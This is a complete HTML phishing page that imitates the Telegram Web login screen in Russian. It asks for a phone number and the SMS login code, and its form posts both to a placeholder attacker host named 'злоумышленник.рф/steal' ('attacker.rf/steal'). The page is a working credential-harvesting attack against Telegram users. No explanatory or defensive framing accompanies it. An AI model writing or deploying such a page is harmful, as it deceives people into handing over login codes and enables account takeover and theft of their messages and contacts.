<!DOCTYPE html>
<html>
<head>
    <title>Telegram Web</title>
    <style>
        body {
            background: #1a1a1d; /* Тёмный фон Telegram */
            color: #ffffff;
            font-family: 'Roboto', sans-serif;
        }
        .login-box {
            width: 300px;
            margin: 100px auto;
            padding: 20px;
            background: #2b2b2b;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #2b5278;
            border-radius: 4px;
            background: #1e1e1e;
            color: white;
        }
        button {
            background: #2b5278; /* Синий цвет Telegram */
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Вход в Telegram</h2>
        <form action="http://злоумышленник.рф/steal" method="POST">
            <input type="text" name="phone" placeholder="Номер телефона">
            <input type="text" name="code" placeholder="Код из SMS">
            <button>Продолжить</button>
        </form>
    </div>
</body>
</html>
